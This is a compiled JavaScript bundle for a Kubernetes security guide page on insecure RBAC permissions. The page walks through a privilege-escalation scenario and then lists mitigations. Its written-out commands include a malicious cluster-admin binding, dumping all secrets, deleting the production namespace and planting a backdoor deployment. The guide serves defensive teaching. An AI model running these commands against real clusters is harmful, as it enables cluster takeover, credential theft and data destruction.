"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3710],{2484:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>o,contentTitle:()=>a,default:()=>u,frontMatter:()=>c,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"attack_vectors/insecure_rbac_permissions","title":"Insecure RBAC Permissions","description":"Understanding how overly permissive RBAC configurations can lead to unauthorized access and privilege escalation in Kubernetes.","source":"@site/docs/attack_vectors/insecure_rbac_permissions.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/insecure_rbac_permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/insecure_rbac_permissions.md","tags":[],"version":"current","sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Insecure RBAC Permissions","description":"Understanding how overly permissive RBAC configurations can lead to unauthorized access and privilege escalation in Kubernetes."},"sidebar":"guidesSidebar","previous":{"title":"Container Escape Guide","permalink":"/k8s_security/docs/attack_vectors/container_escape"},"next":{"title":"Exposed Kubelet API","permalink":"/k8s_security/docs/attack_vectors/exposed_kubelet_api"}}');var r=n(4848),t=n(8453);const c={sidebar_position:8,title:"Insecure RBAC Permissions",description:"Understanding how overly permissive RBAC configurations can lead to unauthorized access and privilege escalation in Kubernetes."},a="Insecure RBAC Permissions",o={},l=[{value:"Exploitation Scenario: Privilege Escalation via Misconfigured RBAC",id:"exploitation-scenario-privilege-escalation-via-misconfigured-rbac",level:2},{value:"Step 1: Enumerate Existing RBAC Roles and Bindings",id:"step-1-enumerate-existing-rbac-roles-and-bindings",level:3},{value:"Step 2: Impersonate a More Privileged User",id:"step-2-impersonate-a-more-privileged-user",level:3},{value:"Step 3: Create a Malicious ClusterRoleBinding",id:"step-3-create-a-malicious-clusterrolebinding",level:3},{value:"Step 4: Verify Escalated Access",id:"step-4-verify-escalated-access",level:3},{value:"Step 5: Perform Arbitrary Cluster Actions",id:"step-5-perform-arbitrary-cluster-actions",level:3},{value:"Result",id:"result",level:2},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"insecure-rbac-permissions",children:"Insecure RBAC Permissions"})}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"Role-Based Access Control (RBAC)"})," is a core security mechanism in Kubernetes, defining which users or service accounts can perform which actions on which resources. When RBAC policies are overly permissive or misconfigured, they can become a critical attack vector for unauthorized access and full cluster compromise."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"exploitation-scenario-privilege-escalation-via-misconfigured-rbac",children:"Exploitation Scenario: Privilege Escalation via Misconfigured RBAC"}),"\n",(0,r.jsx)(s.p,{children:"An attacker leverages weak RBAC configurations to escalate privileges and gain full control over the Kubernetes cluster."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"step-1-enumerate-existing-rbac-roles-and-bindings",children:"Step 1: Enumerate Existing RBAC Roles and Bindings"}),"\n",(0,r.jsx)(s.p,{children:"Using any account that has permission to list RBAC objects, the attacker inspects roles and bindings:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A\n"})}),"\n",(0,r.jsx)(s.p,{children:"They look for signs of:"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Bindings to ",(0,r.jsx)(s.code,{children:"cluster-admin"})]}),"\n",(0,r.jsxs)(s.li,{children:["Use of wildcards (",(0,r.jsx)(s.code,{children:"'*'"}),") for verbs or resources"]}),"\n",(0,r.jsx)(s.li,{children:"Broad permissions granted to non-admin users"}),"\n"]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"step-2-impersonate-a-more-privileged-user",children:"Step 2: Impersonate a More Privileged User"}),"\n",(0,r.jsxs)(s.p,{children:["If the user has ",(0,r.jsx)(s.code,{children:"impersonate"})," privileges or is bound to a wildcard rule, they test their effective access:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl auth can-i '*' '*' --as=admin\n"})}),"\n",(0,r.jsx)(s.p,{children:"If the output is:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"no\n"})}),"\n",(0,r.jsxs)(s.p,{children:["They cannot yet impersonate the ",(0,r.jsx)(s.code,{children:"admin"})," user. But they may still be able to create bindings if RBAC is lax."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"step-3-create-a-malicious-clusterrolebinding",children:"Step 3: Create a Malicious ClusterRoleBinding"}),"\n",(0,r.jsxs)(s.p,{children:["If the current user can bind a ",(0,r.jsx)(s.code,{children:"ClusterRole"}),", the attacker creates a new binding that escalates privileges."]}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"Malicious binding:"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: pwned-cluster-admin\nsubjects:\n- kind: User\n  name: admin\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,r.jsx)(s.p,{children:"Apply it:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f pwned-cluster-admin.yaml\n"})}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"step-4-verify-escalated-access",children:"Step 4: Verify Escalated Access"}),"\n",(0,r.jsxs)(s.p,{children:["Now that the ",(0,r.jsx)(s.code,{children:"admin"})," user is bound to ",(0,r.jsx)(s.code,{children:"cluster-admin"}),", test again:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl auth can-i '*' '*' --as=admin\n"})}),"\n",(0,r.jsx)(s.p,{children:"Expected output:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"yes\n"})}),"\n",(0,r.jsxs)(s.p,{children:["This confirms that the attacker (or anyone impersonating ",(0,r.jsx)(s.code,{children:"admin"}),") now has unrestricted access across the cluster."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"step-5-perform-arbitrary-cluster-actions",children:"Step 5: Perform Arbitrary Cluster Actions"}),"\n",(0,r.jsxs)(s.p,{children:["With full ",(0,r.jsx)(s.code,{children:"cluster-admin"})," access, the attacker can now do the following:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl exec -it <pod-name> -- /bin/sh\nkubectl delete namespace production\nkubectl get secrets -A\nkubectl create deployment backdoor --image=alpine -- /bin/sh -c 'sleep infinity'\n"})}),"\n",(0,r.jsx)(s.p,{children:"They can even install or modify CRDs, escalate service accounts, or tamper with kube-system components."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"result",children:"Result"}),"\n",(0,r.jsxs)(s.p,{children:["The attacker gains ",(0,r.jsx)(s.strong,{children:"full administrative access"})," over the Kubernetes cluster. This enables:"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"Arbitrary command execution"}),"\n",(0,r.jsx)(s.li,{children:"Data exfiltration"}),"\n",(0,r.jsx)(s.li,{children:"Persistent backdoors"}),"\n",(0,r.jsx)(s.li,{children:"Deletion of workloads or namespaces"}),"\n"]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,r.jsx)(s.p,{children:"To prevent abuse of RBAC:"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Apply the ",(0,r.jsx)(s.strong,{children:"principle of least privilege"})]}),"\n",(0,r.jsxs)(s.li,{children:["Avoid using ",(0,r.jsx)(s.code,{children:"'*'"})," in ",(0,r.jsx)(s.code,{children:"verbs"})," and ",(0,r.jsx)(s.code,{children:"resources"})]}),"\n",(0,r.jsxs)(s.li,{children:["Scope ",(0,r.jsx)(s.code,{children:"Roles"})," to namespaces instead of using ",(0,r.jsx)(s.code,{children:"ClusterRoles"})," when possible"]}),"\n",(0,r.jsx)(s.li,{children:"Regularly audit RBAC policies and bindings"}),"\n",(0,r.jsxs)(s.li,{children:["Prevent creation of new ",(0,r.jsx)(s.code,{children:"ClusterRoleBindings"})," without approval"]}),"\n",(0,r.jsx)(s.li,{children:"Block wildcard impersonation rights"}),"\n"]}),"\n",(0,r.jsx)(s.p,{children:"For more comprehensive mitigation techniques, refer to:"}),"\n",(0,r.jsxs)(s.p,{children:["\u27a1 ",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/insecure_rbac_permissions_mitigation",children:"Securing RBAC Permissions"})})]})]})}function u(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>a});var i=n(6540);const r={},t=i.createContext(r);function c(e){const s=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),i.createElement(t.Provider,{value:s},e.children)}}}]);